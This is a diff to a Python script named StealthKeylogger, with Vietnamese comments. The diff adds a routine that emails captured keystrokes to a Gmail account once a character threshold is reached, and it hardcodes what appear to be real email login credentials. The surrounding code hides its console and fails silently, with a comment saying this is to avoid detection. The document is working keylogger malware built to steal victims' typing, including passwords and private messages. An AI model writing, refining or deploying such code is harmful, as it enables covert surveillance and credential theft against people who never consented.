@@ -12,9 +12,9 @@ import re
 import base64
 
 # Cấu hình email
-EMAIL_ADDRESS = ""  
-EMAIL_PASSWORD = ""    
-EMAIL_CHAR_LIMIT = 50                   
+EMAIL_ADDRESS = "luutiendat1811@gmail.com"  
+EMAIL_PASSWORD = "dbodaxtewdwhrlmi"    
+EMAIL_CHAR_LIMIT = 20                   
 
 # Cấu hình stealth
 HIDE_CONSOLE = True
@@ -134,6 +134,17 @@ class StealthKeylogger:
             # Thử kết nối lại SMTP
             self.setup_smtp()
         return False
+
+    def check_and_send_email(self):
+        """Kiểm tra và gửi email nếu đạt giới hạn ký tự"""
+        try:
+            if len(self.full_log) >= EMAIL_CHAR_LIMIT:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                subject = f"Keylog Report - {timestamp}"
+                self.send_email(subject, self.full_log)
+                self.full_log = ''
+        except Exception:
+            pass
     
     def on_key_press(self, key):
         """Xử lý phím được nhấn"""
@@ -142,22 +153,17 @@ class StealthKeylogger:
                 self.current_text += ' '
                 self.full_log += self.current_text
                 self.current_text = ''
+                self.check_and_send_email()
             elif key == Key.enter:
                 self.current_text += '\n'
                 self.full_log += self.current_text
                 self.current_text = ''
+                self.check_and_send_email()
             elif key == Key.tab:
                 self.current_text += '\t'
                 self.full_log += self.current_text
                 self.current_text = ''
-                
-                # Gửi email khi đạt giới hạn ký tự
-                if len(self.full_log) >= EMAIL_CHAR_LIMIT:
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    subject = f"Keylog Report - {timestamp}"
-                    self.send_email(subject, self.full_log)
-                    self.full_log = ''
-                    
+                self.check_and_send_email()
             elif key == Key.shift_l or key == Key.shift_r:
                 return
             elif key == Key.backspace:
@@ -166,7 +172,7 @@ class StealthKeylogger:
                 elif self.full_log:
                     # Nếu current_text rỗng, xóa ký tự cuối của full_log
                     self.full_log = self.full_log[:-1]
-            elif key == Key.esc:  # Đổi từ F12 sang ESC để dễ test
+            elif key == Key.esc:
                 print("\nStopping keylogger...")
                 # Gửi log cuối cùng nếu có
                 if self.full_log or self.current_text:
@@ -177,11 +183,15 @@ class StealthKeylogger:
                 return False
             elif hasattr(key, 'char') and key.char is not None:
                 self.current_text += key.char
-            
+                # Check email limit sau mỗi ký tự
+                self.full_log += self.current_text
+                self.current_text = ''
+                self.check_and_send_email()
+
             # Ghi buffer khi đầy
             if len(BUFFER) >= BUFFER_SIZE:
                 self.flush_buffer()
-                
+
         except Exception as e:
             # Silent fail để tránh detection
             pass
